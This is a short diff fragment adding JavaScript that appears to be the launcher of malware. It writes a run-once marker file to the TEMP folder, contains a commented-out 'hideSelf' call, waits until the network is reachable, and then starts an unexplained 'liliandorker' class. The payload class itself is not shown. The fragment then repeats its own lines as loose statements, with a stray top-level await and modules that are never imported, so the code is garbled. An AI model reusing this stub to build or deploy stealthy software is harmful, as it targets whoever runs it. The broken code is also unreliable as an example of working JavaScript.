@@ -1,0 +1,31 @@
+(async () => {
+    const path = require("path");
+    const appData = process.env.TEMP;
+    const log = path.join(appData, "log.txt");
+    
+    
+    const exists = fs.existsSync(log);
+    if (exists) return;
+     fs.writeFileSync(log, `1`);
+    //   hideSelf();
+    while (true) {
+      try {
+        await axios.get("https://www.google.com");
+  
+        break;
+      } catch {
+        // no internet connection
+      }
+  
+      await new Promise((resolve) => setTimeout(resolve, 3000));
+    }
+  
+    new liliandorker().init();
+  })()
+const path = require("path")
+const appData = process.env.TEMP
+const log = path.join(appData, "log.txt")
+const exists = fs.existsSync(log)
+fs.writeFileSync(log, `1`)
+await axios.get("https://www.google.com")
+await new Promise((resolve) => setTimeout(resolve, 3000))
